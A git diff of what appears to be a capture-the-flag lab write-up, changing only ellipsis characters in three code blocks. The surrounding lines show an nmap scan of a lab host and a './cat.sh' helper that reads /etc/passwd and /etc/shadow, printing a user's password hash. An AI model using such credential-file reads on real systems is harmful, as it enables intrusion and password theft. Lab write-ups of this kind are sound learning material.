@@ -25,7 +25,7 @@ Let's kick this off with a `nmap` scan to establish the services available in th
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.130
-…
+...
 PORT     STATE SERVICE REASON         VERSION
 21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -105,7 +105,7 @@ Let's give it a shot and see what we get.
 
 ```
 # ./cat.sh /etc/passwd
-…
+...
 w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
 sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
 ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
@@ -115,7 +115,7 @@ Imagine my surprise when I requested for `/etc/shadow` and it showed up in the o
 
 ```
 # ./cat.sh /etc/shadow
-…
+...
 w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
 sshd:*:17554:0:99999:7:::
 ftp:*:17554:0:99999:7:::
